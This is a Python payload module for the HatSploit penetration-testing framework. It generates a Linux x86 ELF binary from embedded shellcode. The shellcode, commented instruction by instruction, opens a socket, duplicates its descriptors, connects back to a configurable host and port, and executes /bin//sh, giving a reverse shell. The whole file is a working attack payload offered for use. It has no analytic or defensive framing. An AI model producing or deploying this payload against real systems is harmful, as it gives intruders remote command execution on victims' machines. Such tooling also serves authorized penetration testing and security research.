#!/usr/bin/env python3

#
# This payload requires HatSploit: https://hatsploit.netlify.app
# Current source: https://github.com/EntySec/HatSploit
#

from hatvenom import HatVenom
from hatsploit.lib.payload import Payload
from hatsploit.utils.tcp import TCPClient


class HatSploitPayload(Payload, HatVenom):
    details = {
        'Category': "stager",
        'Name': "Linux x86 Shell Reverse TCP",
        'Payload': "linux/x86/shell_reverse_tcp",
        'Authors': [
            'Ivan Nikolsky (enty8080) - payload developer'
        ],
        'Description': "Shell reverse TCP payload for Linux x86.",
        'Comments': [
            ''
        ],
        'Architecture': "x86",
        'Platform': "linux",
        'Risk': "high",
        'Type': "reverse_tcp"
    }

    options = {
        'CBHOST': {
            'Description': "Connect-back host.",
            'Value': TCPClient.get_local_host(),
            'Type': "ip",
            'Required': True
        },
        'CBPORT': {
            'Description': "Connect-back port.",
            'Value': 8888,
            'Type': "port",
            'Required': True
        }
    }

    def run(self):
        connback_host, connback_port = self.parse_options(self.options)

        offsets = {
            'cbhost': connback_host,
            'cbport': connback_port
        }

        shellcode = (
            b"\x31\xdb"              # xor ebx,ebx
            b"\xf7\xe3"              # mul ebx
            b"\x53"                  # push ebx
            b"\x43"                  # inc ebx
            b"\x53"                  # push ebx
            b"\x6a\x02"              # push byte +0x2
            b"\x89\xe1"              # mov ecx,esp
            b"\xb0\x66"              # mov al,0x66 (sys_socketcall)
            b"\xcd\x80"              # int 0x80
            b"\x93"                  # xchg eax,ebx
            b"\x59"                  # pop ecx
            b"\xb0\x3f"              # mov al,0x3f (sys_dup2)
            b"\xcd\x80"              # int 0x80
            b"\x49"                  # dec ecx
            b"\x79\xf9"              # jns 0x11
            b"\x68:cbhost:ip:"        # push ip addr
            b"\x68\x02\x00"          # push port
            b":cbport:port:"
            b"\x89\xe1"              # mov ecx,esp
            b"\xb0\x66"              # mov al,0x66 (sys_socketcall)
            b"\x50"                  # push eax
            b"\x51"                  # push ecx
            b"\x53"                  # push ebx
            b"\xb3\x03"              # mov bl,0x3
            b"\x89\xe1"              # mov ecx,esp
            b"\xcd\x80"              # int 0x80
            b"\x52"                  # push edx
            b"\x68\x6e\x2f\x73\x68"  # push n/sh
            b"\x68\x2f\x2f\x62\x69"  # push //bi
            b"\x89\xe3"              # mov ebx,esp
            b"\x52"                  # push edx
            b"\x53"                  # push ebx
            b"\x89\xe1"              # mov ecx,esp
            b"\xb0\x0b"              # mov al,0xb (execve)
            b"\xcd\x80"              # int 0x80
        )

        payload = self.generate('elf', 'x86', shellcode, offsets)
        return payload
